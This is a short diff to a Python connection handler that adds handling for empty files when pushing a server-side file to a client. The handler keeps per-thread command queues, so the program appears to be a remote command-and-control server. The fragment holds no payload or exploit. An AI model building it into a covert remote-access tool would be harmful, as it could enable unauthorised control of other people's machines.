@@ -73,11 +73,18 @@ def handle_conn(connection, address, thread_index):
                         if response.startswith("Ready"):
                             with open(file_path, 'rb') as f:
                                 contents = f.read()
-                            # Send the file contents
-                            connection.send(contents) 
+                            # Check if the file is empty and adjust behavior accordingly
+                            if not contents:
+                                # Handle empty file case, e.g., by sending a specific message
+                                CMD_OUTPUT[thread_index] = "Empty Contents"
+                                # Send a specific acknowledgment for the empty file scenario to the client
+                                connection.send("Empty File Acknowledged".encode())
+                            else:
+                                # Send the file contents for non-empty files
+                                connection.send(contents)
                             # Receive acknowledgment from the client
                             response = connection.recv(2048).decode()
-                            if response.startswith("File Upload Successful"):
+                            if response.startswith("File Upload Successful") or response.startswith("Empty File"):
                                 CMD_OUTPUT[thread_index] = response
                                 CMD_INPUT[thread_index] = ''
                             else:
@@ -89,6 +96,8 @@ def handle_conn(connection, address, thread_index):
                     else:
                         CMD_OUTPUT[thread_index] = "Error: File not found on server side."
                         CMD_INPUT[thread_index] = ''
+
+
                    
                 else:
                     msg = CMD_INPUT[thread_index]
